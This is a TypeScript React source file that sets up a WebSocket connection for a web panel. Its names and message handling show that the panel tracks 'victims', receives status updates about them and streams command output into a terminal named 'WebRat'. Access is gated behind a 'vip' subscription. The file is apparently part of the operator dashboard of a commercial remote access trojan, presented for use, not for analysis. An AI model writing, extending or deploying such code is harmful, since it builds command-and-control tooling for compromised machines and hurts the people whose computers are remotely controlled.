"use client";

import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";

import type { Victim } from "../api/victims";
import { readWsHostGlobal, migrateLegacyWsHostGlobal } from "../settings/storage";
import { useSubscriptionQuery } from "../hooks/use-subscription-query";
import { dispatchWsMessage, getWsUrl, safeJsonParse, type WsConnState, type WsJson } from "./ws-client";

type WsCtx = {
  state: WsConnState;
  sendJson: (payload: Record<string, unknown>) => boolean;
};

const Ctx = createContext<WsCtx | null>(null);

export function usePanelWS(): WsCtx {
  const v = useContext(Ctx);
  if (!v) {
    return {
      state: "idle",
      sendJson: () => false,
    };
  }
  return v;
}

export function PanelWsProvider(props: { children: React.ReactNode }) {
  const { children } = props;
  const qc = useQueryClient();
  const subQ = useSubscriptionQuery();

  const [state, setState] = useState<WsConnState>("idle");

  const wsRef = useRef<WebSocket | null>(null);
  const reconnectTimer = useRef<number | null>(null);
  const connectRef = useRef<() => void>(() => {
    return;
  });

  const isVip = String(subQ.data?.status || "").toLowerCase() === "vip";

  const clearReconnect = useCallback(() => {
    if (reconnectTimer.current != null) {
      window.clearTimeout(reconnectTimer.current);
      reconnectTimer.current = null;
    }
  }, []);

  const closeWs = useCallback(() => {
    clearReconnect();
    const ws = wsRef.current;
    wsRef.current = null;
    if (ws) {
      try {
        ws.onopen = null;
        ws.onclose = null;
        ws.onerror = null;
        ws.onmessage = null;
        ws.close();
      } catch {
      }
    }
    setState("closed");
  }, [clearReconnect]);

  const scheduleReconnect = useCallback(() => {
    if (!isVip) return;
    clearReconnect();
    reconnectTimer.current = window.setTimeout(() => {
      try {
        connectRef.current();
      } catch {
      }
    }, 5000);
  }, [clearReconnect, isVip]);

  const connect = useCallback(() => {
    if (!isVip) return;

    clearReconnect();

    const existing = wsRef.current;
    if (existing && (existing.readyState === WebSocket.OPEN || existing.readyState === WebSocket.CONNECTING)) {
      return;
    }

    try {
      migrateLegacyWsHostGlobal();
    } catch {
    }

    const host = readWsHostGlobal() || (typeof window !== "undefined" ? window.location.host : "");
    const url = getWsUrl(host);

    let ws: WebSocket;
    try {
      ws = new WebSocket(url);
    } catch {
      return;
    }

    wsRef.current = ws;
    setState("connecting");

    ws.onopen = () => {
      setState("open");
      try {
        qc.invalidateQueries({ queryKey: ["victims"] });
      } catch {
      }
    };

    ws.onerror = () => {
      // keep state; close will trigger reconnect
    };

    ws.onmessage = (event) => {
      const msg = safeJsonParse(String((event as MessageEvent).data || ""));
      if (!msg) return;

      const t = String(msg.type || "");

      if (t === "victims" && Array.isArray((msg as any).victims)) {
        const list = ((msg as any).victims as unknown[]).filter(Boolean) as Victim[];
        qc.setQueryData(["victims"], list);
      } else if (t === "update") {
        const id = String((msg as any).id || "").trim();
        if (!id) return;
        qc.setQueryData(["victims"], (prev: unknown) => {
          const arr = Array.isArray(prev) ? (prev as Victim[]) : [];
          const idx = arr.findIndex((v) => String((v as any).id ?? "") === id);
          if (idx === -1) return arr;
          const next = [...arr];
          next[idx] = { ...next[idx], ...(msg as any) } as Victim;
          return next;
        });
      } else if (t === "cmd_output") {
        try {
          const out = (msg as any).output;
          if (typeof (window as any).WebRatAppendTerminalOutput === "function") {
            (window as any).WebRatAppendTerminalOutput(out != null ? String(out) : "");
          }
        } catch {
        }
      }

      dispatchWsMessage(msg as WsJson);
    };

    ws.onclose = () => {
      wsRef.current = null;
      setState("closed");

      scheduleReconnect();
    };
  }, [clearReconnect, isVip, qc, scheduleReconnect]);

  useEffect(() => {
    connectRef.current = connect;
  }, [connect]);

  useEffect(() => {
    if (!isVip) {
      closeWs();
      return;
    }

    connect();
    return () => {
      closeWs();
    };
  }, [closeWs, connect, isVip]);

  const sendJson = useCallback((payload: Record<string, unknown>): boolean => {
    const ws = wsRef.current;
    if (!ws || ws.readyState !== WebSocket.OPEN) return false;
    try {
      ws.send(JSON.stringify(payload));
      return true;
    } catch {
      return false;
    }
  }, []);

  const value = useMemo(() => ({ state, sendJson }), [sendJson, state]);

  return <Ctx.Provider value={value}>{children}</Ctx.Provider>;
}
